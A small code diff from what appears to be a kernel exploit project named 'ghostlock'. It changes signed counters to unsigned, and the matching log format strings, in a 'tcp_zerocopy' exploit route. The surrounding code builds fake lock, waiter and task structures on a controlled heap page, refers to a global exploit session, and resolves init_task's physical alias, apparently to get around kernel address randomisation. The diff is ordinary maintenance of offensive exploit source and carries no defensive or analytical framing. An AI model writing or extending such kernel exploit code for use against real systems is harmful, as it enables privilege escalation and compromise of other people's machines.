@@ -290,13 +290,13 @@ namespace ghostlock::route::tcp_zerocopy {
     route::RouteStatus TcpZerocopyRoute::execute() noexcept {
         /* waiter->task carries init_task's phys alias, not the image address */
         uintptr_t waiter_task = ghostlock::profile::slide_init_task();
-        int32_t arm_seq = profile.tcp_arm_sequence();
-        int32_t post_hold =
+        uint32_t arm_seq = profile.tcp_arm_sequence();
+        uint32_t post_hold =
                 profile.tcp_post_receive_hold_iterations();
-        int32_t attempts = profile.tcp_attempts();
+        uint32_t attempts = profile.tcp_attempts();
 
         pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
-                "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
+                "fake_task=%016zx task=%016zx attempts=%u arm=%u hold=%u\n",
                 (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                 (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                 waiter_task,
